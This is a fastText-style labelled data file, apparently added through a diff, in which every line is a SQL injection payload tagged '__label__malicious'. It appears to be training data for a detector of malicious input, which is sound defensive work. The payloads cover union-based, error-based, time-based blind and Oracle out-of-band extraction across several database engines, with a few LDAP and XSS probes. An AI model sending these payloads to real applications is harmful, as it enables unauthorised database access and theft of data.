+__label__malicious  1" and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --
+__label__malicious  1 uni/**/on select all from where
+__label__malicious  1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and 'dubu' like 'dubu
+__label__malicious  1 waitfor delay '0:0:5'--
+__label__malicious  1 where 4477 = 4477 union all select null,null,null,null,null,null,null,null,null,null--
+__label__malicious  -3475" or elt ( 5532 = 4242,4242 ) 
+__label__malicious  1%' or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and '%' = '
+__label__malicious  1"  )  )   as wssb where 5772 = 5772
+__label__malicious  -3107' )  where 7782 = 7782 or 8571 = 8571--
+__label__malicious   select * from users where id = '1' or \.<$ union select 1,@@VERSION -- 1'
+__label__malicious  1" )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( "dppw" like "dppw
+__label__malicious  1"  )  )   as eglv where 7412 = 7412 union all select null#
+__label__malicious  -8695 union all select 6087,6087,6087,6087,6087,6087,6087,6087,6087,6087#
+__label__malicious  select  ( case when  ( 7217 = 7631 )  then 7217 else 7217* ( select 7217 from information_schema.character_sets )  end ) #
+__label__malicious  1" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and "menm" like "menm
+__label__malicious  ' or 1 in  ( select @@version ) --
+__label__malicious   select * from users where id = 1<@<@ union select 1,version (  )  -- 1
+__label__malicious   end and   (  (   ( "%" = "
+__label__malicious  1%"  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( "%" = "
+__label__malicious  -1106'  )  )   union all select 2855,2855,2855,2855,2855,2855,2855#
+__label__malicious  -5849 )  union all select 6168,6168,6168,6168,6168,6168,6168,6168#
+__label__malicious  select  ( case when  ( 4291 = 6937 )  then 4291 else 4291* ( select 4291 from mysql.db )  end ) #
+__label__malicious  -2745' or elt ( 1032 = 1032,3623 ) 
+__label__malicious  1'  )  )   as yyja where 4321 = 4321 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
+__label__malicious  select count ( * )  from generate_series ( 1,5000000 ) -- gqkk
+__label__malicious  1' )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ( 'qbdm' = 'qbdm
+__label__malicious  1" )  where 8153 = 8153
+__label__malicious  1'  )  )   or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  'uwrm' = 'uwrm
+__label__malicious  1 )  as ujjg where 3125 = 3125 union all select null,null,null,null,null,null#
+__label__malicious  1" )  where 3321 = 3321
+__label__malicious  1'  )  )   )  or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
+__label__malicious  -6965' )  union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--
+__label__malicious  ' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --
+__label__malicious  1"  )  )   rlike sleep ( 5 ) #
+__label__malicious  1" )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( "rwlq" = "rwlq
+__label__malicious  1" where 9342 = 9342 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --
+__label__malicious  1 )  as gfhf where 5804 = 5804 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --
+__label__malicious  1" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  
+__label__malicious  1%"  )  )   union all select null,null,null,null,null,null--
+__label__malicious  1%'  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
+__label__malicious  ' union all select @@version--
+__label__malicious  1" and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and "ojpe" like "ojpe
+__label__malicious  1"  )  )   as uqem where 3521 = 3521
+__label__malicious  1'  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  'stqq' = 'stqq
+__label__malicious  -7764" or 7308 = 7805
+__label__malicious  1'+ ( select ukwc where 3008 = 3008 or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #
+__label__malicious  1"  )  )   union all select null,null--
+__label__malicious  1\'1
+__label__malicious  -9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--
+__label__malicious  select  ( case when  ( 1868 = 5071 )  then 1 else 1868* ( select 1868 from master..sysdatabases )  end ) --
+__label__malicious  1" and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  
+__label__malicious  1' or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and 'bwtk' = 'bwtk
+__label__malicious  -2759%"  )  )   or 7769 = 1249#
+__label__malicious  1" )  as fcrx where 2929 = 2929 and 2820 = 5133
+__label__malicious  1%'  )  )   and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
+__label__malicious  -5365 or 7517 = 5726--
+__label__malicious  -5657'  )  )   )  union all select 8071,8071,8071,8071,8071,8071,8071,8071#
+__label__malicious  iif ( 1305 = 5656,1,1/0 ) 
+__label__malicious  1%' union all select null,null,null,null#
+__label__malicious  1" and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and "bzzt" like "bzzt
+__label__malicious  1'  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 'cjre' = 'cjre
+__label__malicious  1' where 7080 = 7080 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #
+__label__malicious  ' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i
+__label__malicious  1' )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
+__label__malicious  1' )  as pfwt where 8448 = 8448 union all select null,null,null,null,null,null,null,null,null#
+__label__malicious  1" )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  ( "ponv" = "ponv
+__label__malicious  1' )  as nexa where 6740 = 6740
+__label__malicious  -1033 union all select 8731,8731,8731,8731,8731,8731--
+__label__malicious   select * from users where id = 1 union select 1<@$,version (  )  -- 1
+__label__malicious  1%'  )  )   )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( '%' = '
+__label__malicious  " ) ;waitfor delay '0:0:__TIME__'--
+__label__malicious  -6514  )  )   as pbgg where 6841 = 6841 union all select 6841,6841,6841,6841--
+__label__malicious  1'+ ( select gqez where 3704 = 3704
+__label__malicious  -1287" )  as bbzg where 1475 = 1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#
+__label__malicious  1" )  as pydh where 3407 = 3407 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --
+__label__malicious  1%"  )  )   or sleep ( 5 )  and   (  (  "%" = "
+__label__malicious  1 )  union all select null,null,null,null,null#
+__label__malicious  1%' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and  ( '%' = '
+__label__malicious  1' )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( 'lwlh' = 'lwlh
+__label__malicious  1'  )  )   as lrnh where 8569 = 8569 union all select null,null,null,null,null--
+__label__malicious  1"  )  )   union all select null,null#
+__label__malicious  exec xp
+__label__malicious  1'  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( 'mbxh' like 'mbxh
+__label__malicious  1"  )  )   )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( "fjwv" like "fjwv
+__label__malicious  select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (  "%" = "
+__label__malicious  1%' and sleep ( 5 )  and '%' = '
+__label__malicious  1%'  )  )   )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (   ( '%' = '
+__label__malicious  ' )  or  ( 'x' = 'x
+__label__malicious  1'+ ( select sxco where 1623 = 1623 union all select null,null--
+__label__malicious  -5520%" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--
+__label__malicious   select * from users where id = 1 or ".." = 1 or 1 = 1 -- 1
+__label__malicious  1'  )  )   as dago where 9788 = 9788
+__label__malicious  -9871 union all select 6094,6094,6094,6094,6094,6094,6094#
+__label__malicious  1'+ ( select cxvy where 7421 = 7421
+__label__malicious  1'|| ( select 'wyng' from dual where 2157 = 2157 union all select null,null--
+__label__malicious  1'+ ( select aahc where 5436 = 5436 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   ) +'
+__label__malicious  -3956' )  or  ( 8459 = 8459 ) *4906 and  ( 'rflo' like 'rflo
+__label__malicious  1" where 2886 = 2886
+__label__malicious  1'  )  )   as hqhs where 5383 = 5383
+__label__malicious  -5959" or 2477 = 1144
+__label__malicious  -5617 )  where 2132 = 2132 union all select 2132,2132,2132,2132#
+__label__malicious  1' )  and make_set ( 6488 = 5525,5525 ) 
+__label__malicious  select sleep ( 5 )  and  ( '%' = '
+__label__malicious  1' where 9024 = 9024 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --
+__label__malicious  * ( | ( objectclass = *  )  )  
+__label__malicious  1  )  )   )  or sleep ( 5 )  and   (  (   ( 2209 = 2209
+__label__malicious  1%' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and '%' = '
+__label__malicious  1%"  )  )   )  and 7758 = 4792 and   (  (   ( "%" = "
+__label__malicious  -6527'  )  )   union all select 5053,5053,5053,5053--
+__label__malicious  23 OR 1 = 1
+__label__malicious  1%" ) 
+__label__malicious  1'  )  )   or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (  'xuwl' like 'xuwl
+__label__malicious  -1351" where 6968 = 6968 or 5684 = 8582
+__label__malicious  -1573" )  union all select 3928,3928,3928,3928--
+__label__malicious  -4355"  )  )   )  or 9323 = 9323#
+__label__malicious  select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and 'hvqt' = 'hvqt
+__label__malicious  1' )  where 2802 = 2802 union all select null,null,null#
+__label__malicious  1'|| ( select 'hwyv' from dual where 1155 = 1155 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   ) ||'
+__label__malicious  1'  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'ofko' = 'ofko
+__label__malicious  -9031%" )  order by 1--
+__label__malicious  -4100'  )  )   union all select 1163,1163,1163--
+__label__malicious  1'+ ( select 'sqje' where 1634 = 1634 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   ) +'
+__label__malicious  1" )  as vcvw where 2445 = 2445 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --
+__label__malicious  1' )  where 6941 = 6941 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --
+__label__malicious  -3130'  )  )   )  union all select 2886,2886,2886,2886,2886,2886,2886#
+__label__malicious  1 )  as azoo where 8933 = 8933 and  ( 3020 = 3020 ) *6703--
+__label__malicious  -3300' union all select 8979,8979,8979,8979,8979,8979--
+__label__malicious  1" )  as ebvt where 5305 = 5305
+__label__malicious  -6249'  )  )   )  union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--
+__label__malicious  1"  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( "vhmc" = "vhmc
+__label__malicious  1 )  as tngy where 8956 = 8956 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --
+__label__malicious  ' or username like '%
+__label__malicious  1" and 7533 = 7533 and "dqjp" = "dqjp
+__label__malicious   select * from users where id = 1 or "1&" or 1 = 1 -- 1
+__label__malicious  1'  )  )   or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (  'ossj' = 'ossj
+__label__malicious   select * from users where id = 1<@.. union select 1,version (  )  -- 1
+__label__malicious  1" )  where 2473 = 2473 and make_set ( 6118 = 7684,7684 ) --
+__label__malicious  -9978" or make_set ( 4893 = 9765,9765 )  and "mhjt" = "mhjt
+__label__malicious  -5516'+ ( select 'bmlv' where 7188 = 7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#
+__label__malicious  1"  )  )   procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (  "rtyu" like "rtyu
+__label__malicious  1%' )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( '%' = '
+__label__malicious  -1393'  )  )   )  union all select 8280--
+__label__malicious   select * from users where id = 1 or ". ) " or 1 = 1 -- 1
+__label__malicious  1" )  union all select null--
+__label__malicious   select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1
+__label__malicious  -2120" )  union all select 9614--
+__label__malicious  1" )  as pgza where 8756 = 8756 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
+__label__malicious  call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and "rugr" = "rugr
+__label__malicious  -8812 or 6872 = 6872# dflr
+__label__malicious   select * from users where id = 1 or ";_" or 1 = 1 -- 1
+__label__malicious  1'+ ( select oogh where 1167 = 1167 or elt ( 5873 = 5873,sleep ( 5  )  )  #
+__label__malicious  -1603'  )  )   or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  'abmo' = 'abmo
+__label__malicious  1 where 6036 = 6036 and 7533 = 7533--
+__label__malicious  1' and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and 'lvyw' = 'lvyw
+__label__malicious  1 where 8921 = 8921 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --
+__label__malicious  iif ( 2205 = 4764,1,1/0 ) 
+__label__malicious  1'+ ( select gguu where 7809 = 7809 union all select null--
+__label__malicious  UEs
+__label__malicious  -1263" )  or 9323 = 9323#
+__label__malicious   select sleep ( 5 )  and 'hhrw' like 'hhrw
+__label__malicious  1"  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( "sdvu" like "sdvu
+__label__malicious  -9896"  )  )   )  union all select 4073,4073,4073,4073,4073#
+__label__malicious  1" )  where 5358 = 5358
+__label__malicious  1' )  as rqfq where 7077 = 7077 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --
+__label__malicious  -7006' where 6966 = 6966 union all select 6966,6966,6966,6966#
+__label__malicious  1' )  where 9951 = 9951  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) --
+__label__malicious  -2679'  )  )   )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'cutk' like 'cutk
+__label__malicious  1' where 8584 = 8584 order by 1#
+__label__malicious  select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (  '%' = '
+__label__malicious  -7246'|| ( select 'qchp' from dual where 8317 = 8317 order by 1--
+__label__malicious  select  ( case when  ( 4306 = 2815 )  then 4306 else 1/ ( select 0 )  end ) --
+__label__malicious  select  ( case when  ( 7978 = 6009 )  then 7978 else 1/ ( select 0 )  end ) --
+__label__malicious  1' and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and 'dphz' = 'dphz
+__label__malicious  1 or benchmark ( 10000000,MD5 ( 1  )  )  #
+__label__malicious  1"  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( "uzjn" = "uzjn
+__label__malicious  -4896' )  union all select 1929--
+__label__malicious  1' )  rlike sleep ( 5 )  and  ( 'qsub' like 'qsub
+__label__malicious  1' )  as xhmm where 8092 = 8092 union all select null,null,null--
+__label__malicious  1' where 7504 = 7504 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --
+__label__malicious  1  )  )   as rhwg where 8843 = 8843
+__label__malicious  or 1 = 1 or "" = 
+__label__malicious  -5866'  )  )   as phzq where 3803 = 3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--
+__label__malicious  -9947"  )  )   )  union all select 8765,8765,8765,8765,8765#
+__label__malicious  1 )  union all select null,null,null,null#
+__label__malicious  1'|| ( select 'dpce' from dual where 5261 = 5261 union all select null,null,null,null,null,null--
+__label__malicious  1' )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --
+__label__malicious  select pg_sleep ( 5 )  and   (  (  "byhx" like "byhx
+__label__malicious  1' )  union all select null,null,null,null,null,null,null,null--
+__label__malicious  1%'  )  )   union all select null,null,null,null#
+__label__malicious  1'  )  )   as bsvk where 5985 = 5985 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --
+__label__malicious  1'  )  )   )  and 5615 = 5458--
+__label__malicious  -7435' )  where 6242 = 6242 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --
+__label__malicious  1' )  as zmvn where 2887 = 2887 union all select null--
+__label__malicious  1,iif ( 7475 = 7475,1,1/0 ) 
+__label__malicious  -1998' )  as kgvf where 2346 = 2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--
+__label__malicious  1  )  )   )  and 9198 = 9198--
+__label__malicious  1'  )  )   and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (  'jnmf' = 'jnmf
+__label__malicious  select pg_sleep ( 5 )  and   (  (  "qani" = "qani
+__label__malicious  1'  )  )   as gfzb where 7904 = 7904
+__label__malicious  1' )  and 7533 = 7533 and  ( 'dbjq' = 'dbjq
+__label__malicious  1 )  rlike sleep ( 5 ) #
+__label__malicious  1"  )  )   )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( "uqyb" = "uqyb
+__label__malicious   ( select * from generate_series ( 4990,4990,case when  ( 4990 = 5065 )  then 1 else 0 end )  limit 1 ) 
+__label__malicious  1%' )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( '%' = '
+__label__malicious  1%' )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and  ( '%' = '
+__label__malicious  1%' or elt ( 6272 = 6272,sleep ( 5  )  )   and '%' = '
+__label__malicious  -3081"  )  )   )  or 3736 = 1899
+__label__malicious   ( 7098 = 7098 and sleep ( 5  )  )  
+__label__malicious   AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+__label__malicious  ' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i
+__label__malicious  1 where 2672 = 2672 and 1819 = 4322#
+__label__malicious  1'  )  )   or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (  'mttj' like 'mttj
+__label__malicious  -4152" )  where 9781 = 9781 union all select 9781,9781,9781,9781,9781--
+__label__malicious  1  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( 5030 = 5030
+__label__malicious  1%"  )  )   )  union all select null--
+__label__malicious   select * from users where id = 1 +  ( \+ )  union select null,@@VERSION -- 1
+__label__malicious  1" )  as eaxo where 2728 = 2728
+__label__malicious  1" )  as buky where 7898 = 7898 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --
+__label__malicious  1'|| ( select 'bgdh' from dual where 1967 = 1967
+__label__malicious  1'|| ( select 'dezl' where 8661 = 8661
+__label__malicious  -9062" or 6872 = 6872 and "aumq" like "aumq
+__label__malicious  -1844' )  union all select 9572,9572,9572,9572#
+__label__malicious  -2110' or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #
+__label__malicious  1  )  )   as mlpf where 7425 = 7425
+__label__malicious  -1634%' union all select 5937,5937,5937,5937--
+__label__malicious  select * from generate_series ( 3427,3427,case when  ( 3427 = 7516 )  then 1 else 0 end )  limit 1--
+__label__malicious  -9145' )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( 'yvfl' like 'yvfl
+__label__malicious  1' where 7176 = 7176
+__label__malicious  1'qhfy<'">utwq
+__label__malicious   select * from users where id = '1' + $+%$ or 1 = 1 -- 1'
+__label__malicious  -9795 )  as wrgs where 5427 = 5427 union all select 5427,5427,5427,5427,5427,5427--
+__label__malicious  1" )  where 2657 = 2657 and 5309 = 7592--
+__label__malicious  1' )  and 2577 = 7094
+__label__malicious  1'+ ( select sfmz where 4870 = 4870 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
+__label__malicious  1 waitfor delay '0:0:10'--
+__label__malicious  select * from generate_series ( 3827,3827,case when  ( 3827 = 7095 )  then 1 else 0 end )  limit 1--
+__label__malicious  -9581 )  as jkqo where 5200 = 5200 or 6872 = 6872--
+__label__malicious  1" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and "ljkg" = "ljkg
+__label__malicious  1 )  where 9206 = 9206 union all select null,null,null,null,null,null#
+__label__malicious  1%' rlike  ( select  ( case when  ( 3596 = 4245 )  then 1 else 0x28 end  )  )   and '%' = '
+__label__malicious   select * from users where id = '1' union select +\#,@@VERSION -- 1'
+__label__malicious  -2207%' )  or  ( 8459 = 8459 ) *4906 and  ( '%' = '
+__label__malicious  1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'nelb' = 'nelb
+__label__malicious  1'  )  )   waitfor delay '0:0:5' and   (  (  'bbqk' = 'bbqk
+__label__malicious  -5661'  )  )   union all select 3011,3011#
+__label__malicious  1"  )  )   )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( "wvyb" = "wvyb
+__label__malicious  select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and  ( 'dvpw' = 'dvpw
+__label__malicious  1" and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and "jgcv" = "jgcv
+__label__malicious  -8463  )  )   )  or 4861 = 9834#
+__label__malicious  -4093'  )  )   union all select 5785,5785,5785#
+__label__malicious  â or 1 = 1 --
+__label__malicious  1  )  )   as bjxd where 4299 = 4299
+__label__malicious  -4205' )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) 
+__label__malicious  1 )  as wxms where 7272 = 7272 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
+__label__malicious  -9840'  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'dzlp' = 'dzlp
+__label__malicious  1"  )  )   as tmpz where 7224 = 7224 and make_set ( 3579 = 1045,1045 ) --
+__label__malicious  1"  )  )   as ccjk where 1932 = 1932 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
+__label__malicious  -6405' union all select 8235,8235,8235,8235,8235#
